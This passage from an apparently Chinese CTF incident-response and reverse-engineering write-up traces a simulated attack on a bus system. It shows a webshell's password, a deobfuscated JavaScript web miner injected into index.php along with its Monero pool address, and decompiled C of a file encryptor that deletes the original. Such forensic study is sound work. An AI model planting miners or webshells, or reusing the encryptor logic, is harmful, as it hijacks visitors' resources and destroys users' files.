排序</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sunyue-chenhao&#125;</span><br></code></pre></td></tr></table></figure><h2 id="【任务2】公交车系统攻击事件排查"><a href="#【任务2】公交车系统攻击事件排查" class="headerlink" title="【任务2】公交车系统攻击事件排查"></a>【任务2】公交车系统攻击事件排查</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag</span><span class="hljs-template-variable">&#123;xxx&#125;</span><br></code></pre></td></tr></table></figure><p>使用 find 命令查找 ftp 相关信息，找到路径 <code>/home/wangqiang/ftp</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/7c8ca9ec1cd34bce.png"></p><p>查看 sensitive_credentials.txt 内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">flag&#123;<span class="hljs-attribute">INTERNAL_FTP_ADMIN_PASSWORD</span>=FtpP@ssw0rd_For_Admin_Backup_2025&#125;<br></code></pre></td></tr></table></figure><h2 id="【任务3】公交车系统攻击事件排查"><a href="#【任务3】公交车系统攻击事件排查" class="headerlink" title="【任务3】公交车系统攻击事件排查"></a>【任务3】公交车系统攻击事件排查</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag</span><span class="hljs-template-variable">&#123;password&#125;</span><br></code></pre></td></tr></table></figure><p><code>/var/www/html/public/uploads/</code> 目录下有 shell1.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/ea6f9d1baa8a79b8.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;woaiwojia&#125;</span><br></code></pre></td></tr></table></figure><h2 id="【任务4】公交车系统攻击事件排查"><a href="#【任务4】公交车系统攻击事件排查" class="headerlink" title="【任务4】公交车系统攻击事件排查"></a>【任务4】公交车系统攻击事件排查</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag</span><span class="hljs-template-variable">&#123;xxx.xxx&#125;</span><br></code></pre></td></tr></table></figure><p>根目录下有一个 result1.pcap 流量包，下载到本地分析，筛选 POST 请求流量，找到请求数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/3b9e1a2b90326757.png"></p><p>shell1.php 是典型的哥斯拉的 webshell，解密请求数据</p><p><img src="https://img.dkdun.cn/v1/2025/12/17159039d2e0b30a.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">flag&#123;<span class="hljs-built_in">map</span>.php&#125;<br></code></pre></td></tr></table></figure><h2 id="【任务5】公交车系统攻击事件排查"><a href="#【任务5】公交车系统攻击事件排查" class="headerlink" title="【任务5】公交车系统攻击事件排查"></a>【任务5】公交车系统攻击事件排查</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag&#123;xxxxxxx<span class="hljs-selector-class">.xxxx</span><span class="hljs-selector-class">.xxx</span>:xxxx&#125;<br></code></pre></td></tr></table></figure><p>在 index.php 中发现一段 js 代码，被混淆了</p><p><img src="https://img.dkdun.cn/v1/2025/12/5efef951dec4c58d.png"></p><p>让 deepseek 反混淆</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 配置对象</span><br>    <span class="hljs-keyword">var</span> config = &#123;&#125;;<br>    <span class="hljs-comment">// 设置矿池地址：gulf.moneroocean.stream:10128 (Monero 挖矿池)</span><br>    config.<span class="hljs-property">p</span> = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">103</span>, <span class="hljs-number">117</span>, <span class="hljs-number">108</span>, <span class="hljs-number">102</span>, <span class="hljs-number">46</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">46</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">109</span>, <span class="hljs-number">58</span>, <span class="hljs-number">49</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">50</span>, <span class="hljs-number">56</span>);<br>    <span class="hljs-comment">// 设置延迟系数</span><br>    config.<span class="hljs-property">l</span> = <span class="hljs-number">0.8</span>;<br><br>    <span class="hljs-comment">// 主功能函数</span><br>    <span class="hljs-keyword">var</span> execute = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// 任务队列顺序</span><br>        <span class="hljs-keyword">var</span> steps = <span class="hljs-string">&#x27;4|1|3|0|2&#x27;</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;|&#x27;</span>);<br>        <span class="hljs-keyword">var</span> stepIndex = <span class="hljs-number">0</span>;<br>        <br>        <span class="hljs-comment">// 依次执行队列中的任务</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">switch</span> (steps[stepIndex++]) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>                    <span class="hljs-comment">// 此条件永远为假（随机数0-99不可能&gt;100）</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>) &gt; <span class="hljs-number">100</span>) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This will never run&#x27;</span>);<br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>                    <span class="hljs-comment">// 忙等待：阻塞约80毫秒（100*0.8）</span><br>                    <span class="hljs-keyword">var</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime &lt; <span class="hljs-number">100</span> * config.<span class="hljs-property">l</span>) &#123;<br>                        <span class="hljs-comment">// 空循环制造CPU延迟</span><br>                    &#125;<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;2&#x27;</span>:<br>                    <span class="hljs-comment">// 实际执行到此步时函数已结束</span><br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>                    <span class="hljs-comment">// 空步骤</span><br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>                    <span class="hljs-comment">// 空步骤</span><br>                    <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;;<br>    <br>    <span class="hljs-comment">// 执行函数</span><br>    <span class="hljs-title function_">execute</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p>拿到挖矿地址</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;gulf<span class="hljs-selector-class">.moneroocean</span><span class="hljs-selector-class">.stream</span>:<span class="hljs-number">10128</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="B02-奇怪的加密器"><a href="#B02-奇怪的加密器" class="headerlink" title="B02-奇怪的加密器"></a>B02-奇怪的加密器</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">糟糕！一个客户的服务器的一个文件被加密了，为了防止感染，我将其放入了回收站，请你快点恢复我的<span class="hljs-built_in">flag</span>生成器！这非常重要！！！<br></code></pre></td></tr></table></figure><p>定位到主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_C51500</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  _DWORD *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp-Ch] [ebp-9Ch]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp-8h] [ebp-98h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp-4h] [ebp-94h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+4h] [ebp-8Ch] BYREF</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-84h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+18h] [ebp-78h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp+1Ch] [ebp-74h]</span><br>  <span class="hljs-type">void</span> *v14; <span class="hljs-comment">// [esp+20h] [ebp-70h]</span><br>  <span class="hljs-type">char</span> v15; <span class="hljs-comment">// [esp+26h] [ebp-6Ah] BYREF</span><br>  <span class="hljs-type">char</span> v16; <span class="hljs-comment">// [esp+27h] [ebp-69h]</span><br>  <span class="hljs-type">char</span> v17[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+28h] [ebp-68h] BYREF</span><br>  <span class="hljs-type">char</span> v18[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+40h] [ebp-50h] BYREF</span><br>  <span class="hljs-type">char</span> v19[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+58h] [ebp-38h] BYREF</span><br>  <span class="hljs-type">char</span> v20[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [esp+70h] [ebp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v21; <span class="hljs-comment">// [esp+7Fh] [ebp-11h] BYREF</span><br>  <span class="hljs-type">int</span> v22; <span class="hljs-comment">// [esp+8Ch] [ebp-4h]</span><br><br>  <span class="hljs-keyword">if</span> ( a1 &gt;= <span class="hljs-number">2</span> )<br>  &#123;<br>    qmemcpy(v20, <span class="hljs-string">&quot;secret_key_1234&quot;</span>, <span class="hljs-keyword">sizeof</span>(v20));<br>    v9 = sub_C535E0(&amp;v15);<br>    v5 = sub_C53F40(&amp;v10, (<span class="hljs-type">int</span>)v20, (<span class="hljs-type">int</span>)&amp;v21);<br>    sub_C54000(v11, *v5, v5[<span class="hljs-number">1</span>], v9);<br>    v22 = <span class="hljs-number">0</span>;<br>    v14 = sub_C53C90(v17, a2[<span class="hljs-number">1</span>]);<br>    v16 = sub_C51C60(v14, <span class="hljs-string">&quot;enc&quot;</span>);<br>    sub_C54B60(v17);<br>    <span class="hljs-keyword">if</span> ( v16 )<br>    &#123;<br>      sub_C53C90(v18, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;FlagGenerator_v1.T1&quot;</span>);<br>      LOBYTE(v22) = <span class="hljs-number">1</span>;<br>      sub_C53C90(v19, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;FlagGenerator_v1.exe&quot;</span>);<br>      LOBYTE(v22) = <span class="hljs-number">2</span>;<br>      sub_C51160((<span class="hljs-type">int</span>)v19, (<span class="hljs-type">int</span>)v18, (<span class="hljs-type">int</span>)v11);<br>      LOBYTE(v22) = <span class="hljs-number">1</span>;<br>      sub_C54B60(v19);<br>      LOBYTE(v22) = <span class="hljs-number">0</span>;<br>      sub_C54B60(v18);<br>      v12 = <span class="hljs-number">0</span>;<br>      v22 = <span class="hljs-number">-1</span>;<br>      sub_C54C00(v11);<br>      <span class="hljs-keyword">return</span> v12;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v8 = a2[<span class="hljs-number">1</span>];<br>      v6 = sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;未知命令: &quot;</span>);<br>      sub_C51960(v6, v8);<br>      sub_C54FC0(sub_C53210);<br>      v13 = <span class="hljs-number">1</span>;<br>      v22 = <span class="hljs-number">-1</span>;<br>      sub_C54C00(v11);<br>      <span class="hljs-keyword">return</span> v13;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v7 = *a2;<br>    v2 = sub_C51960((<span class="hljs-type">int</span>)&amp;unk_C82138, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;用法:\n  加密: &quot;</span>);<br>    v3 = sub_C51960(v2, v7);<br>    sub_C51960(v3, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot; enc&quot;</span>);<br>    sub_C54FC0(sub_C53210);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对 FlagGenerator_v1.exe 加密，key 为 <code>secret_key_1234</code>， 分析 sub_C51160</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_C51160</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> *v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> *v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> BYTE *v7; <span class="hljs-comment">// eax</span><br>  BYTE *v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> CHAR *v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp-Ch] [ebp-1B8h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [esp-8h] [ebp-1B4h]</span><br>  DWORD v14; <span class="hljs-comment">// [esp-8h] [ebp-1B4h]</span><br>  __int64 v15; <span class="hljs-comment">// [esp-8h] [ebp-1B4h]</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// [esp-4h] [ebp-1B0h]</span><br>  DWORD v17; <span class="hljs-comment">// [esp-4h] [ebp-1B0h]</span><br>  <span class="hljs-type">char</span> v18[<span class="hljs-number">176</span>]; <span class="hljs-comment">// [esp+4h] [ebp-1A8h] BYREF</span><br>  <span class="hljs-type">int</span> v19[<span class="hljs-number">46</span>]; <span class="hljs-comment">// [esp+B4h] [ebp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> v20[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+174h] [ebp-38h] BYREF</span><br>  <span class="hljs-type">char</span> v21[<span class="hljs-number">12</span>]; <span class="hljs-comment">// [esp+17Ch] [ebp-30h] BYREF</span><br>  DWORD dwBufLen; <span class="hljs-comment">// [esp+188h] [ebp-24h]</span><br>  HCRYPTKEY phKey; <span class="hljs-comment">// [esp+18Ch] [ebp-20h] BYREF</span><br>  DWORD pdwDataLen; <span class="hljs-comment">// [esp+190h] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v25; <span class="hljs-comment">// [esp+197h] [ebp-15h] BYREF</span><br>  HCRYPTHASH phHash; <span class="hljs-comment">// [esp+198h] [ebp-14h] BYREF</span><br>  HCRYPTPROV phProv; <span class="hljs-comment">// [esp+19Ch] [ebp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [esp+1A8h] [ebp-4h]</span><br><br>  sub_C53620(a1, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>);<br>  v28 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)sub_C54FE0((<span class="hljs-type">char</span> *)v19 + *(_DWORD *)(v19[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span>)) )<br>  &#123;<br>    v3 = sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;无法打开输入文件: &quot;</span>);<br>    sub_C51930(v3, a1);<br>    sub_C54FC0(sub_C53210);<br>    v28 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> sub_C55250(v19);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v16 = sub_C535E0(&amp;v25);<br>    v5 = (<span class="hljs-type">int</span> *)sub_C53FD0(v20);<br>    v13 = v5[<span class="hljs-number">1</span>];<br>    v12 = *v5;<br>    v6 = (<span class="hljs-type">int</span> *)sub_C53F70(v19);<br>    sub_C51820(v21, *v6, v6[<span class="hljs-number">1</span>], v12, v13, v16);<br>    LOBYTE(v28) = <span class="hljs-number">1</span>;<br>    sub_C56F90(v19);<br>    phProv = <span class="hljs-number">0</span>;<br>    phKey = <span class="hljs-number">0</span>;<br>    phHash = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( CryptAcquireContextA(&amp;phProv, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>u, <span class="hljs-number">0xF0000000</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( CryptCreateHash(phProv, <span class="hljs-number">0x800C</span>u, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;phHash) )<br>      &#123;<br>        v14 = sub_C58580(a3);<br>        v7 = (<span class="hljs-type">const</span> BYTE *)sub_C57050(a3);<br>        CryptHashData(phHash, v7, v14, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ( CryptDeriveKey(phProv, <span class="hljs-number">0x660E</span>u, phHash, <span class="hljs-number">0</span>, &amp;phKey) )<br>        &#123;<br>          pdwDataLen = sub_C58580(v21);<br>          dwBufLen = pdwDataLen + <span class="hljs-number">16</span>;<br>          sub_C58150(pdwDataLen + <span class="hljs-number">16</span>);<br>          v17 = dwBufLen;<br>          v8 = (BYTE *)sub_C57050(v21);<br>          <span class="hljs-keyword">if</span> ( CryptEncrypt(phKey, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, v8, &amp;pdwDataLen, v17) )<br>          &#123;<br>            sub_C538A0(a2, <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">1</span>);<br>            LOBYTE(v28) = <span class="hljs-number">2</span>;<br>            v15 = pdwDataLen;<br>            v9 = sub_C57050(v21);<br>            sub_C58C00(v18, v9, v15);<br>            sub_C56FD0(v18);<br>            v10 = (<span class="hljs-type">const</span> CHAR *)sub_C56DC0(a1);<br>            sub_C5FD86(v10);<br>            v11 = sub_C51960((<span class="hljs-type">int</span>)&amp;unk_C82138, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;加密完成并删除原文件: &quot;</span>);<br>            sub_C51930(v11, a1);<br>            sub_C54FC0(sub_C53210);<br>            LOBYTE(v28) = <span class="hljs-number">1</span>;<br>            sub_C552B0(v18);<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptEncrypt 失败&quot;</span>);<br>            sub_C54FC0(sub_C53210);<br>          &#125;<br>          CryptDestroyKey(phKey);<br>          CryptDestroyHash(phHash);<br>          CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>          LOBYTE(v28) = <span class="hljs-number">0</span>;<br>          sub_C54C00(v21);<br>          v28 = <span class="hljs-number">-1</span>;<br>          <span class="hljs-keyword">return</span> sub_C55250(v19);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptDeriveKey 失败&quot;</span>);<br>          sub_C54FC0(sub_C53210);<br>          CryptDestroyHash(phHash);<br>          CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>          LOBYTE(v28) = <span class="hljs-number">0</span>;<br>          sub_C54C00(v21);<br>          v28 = <span class="hljs-number">-1</span>;<br>          <span class="hljs-keyword">return</span> sub_C55250(v19);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptCreateHash 失败&quot;</span>);<br>        sub_C54FC0(sub_C53210);<br>        CryptReleaseContext(phProv, <span class="hljs-number">0</span>);<br>        LOBYTE(v28) = <span class="hljs-number">0</span>;<br>        sub_C54C00(v21);<br>        v28 = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">return</span> sub_C55250(v19);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      sub_C51960((<span class="hljs-type">int</span>)&amp;dword_C821E8, (<span class="hljs-type">int</span>)<span class="hljs-string">&quot;CryptAcquireContext 失败&quot;</span>);<br>      sub_C54FC0(sub_C53210);<br>      LOBYTE(v28) = <span class="hljs-number">0</span>;<br>      sub_C54C00(v21);<br>      v28 = <span class="hljs-number">-1</span>;<br>      <span class="hljs-keyword">return</span> sub_C55250(v19);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是 Windows CryptoAPI 完成对称加密操作</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">从输入文件 <span class="hljs-built_in">a1</span> 读取数据 → 使用密码（密钥上下文 <span class="hljs-built_in">a3</span>）加密 → 将加密结果写入输出文件 <span class="hljs-built_in">a2</span> → 删除原始文件<br></code></pre></td></tr></table></figure><p>剩下的就拷打 deepseek</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 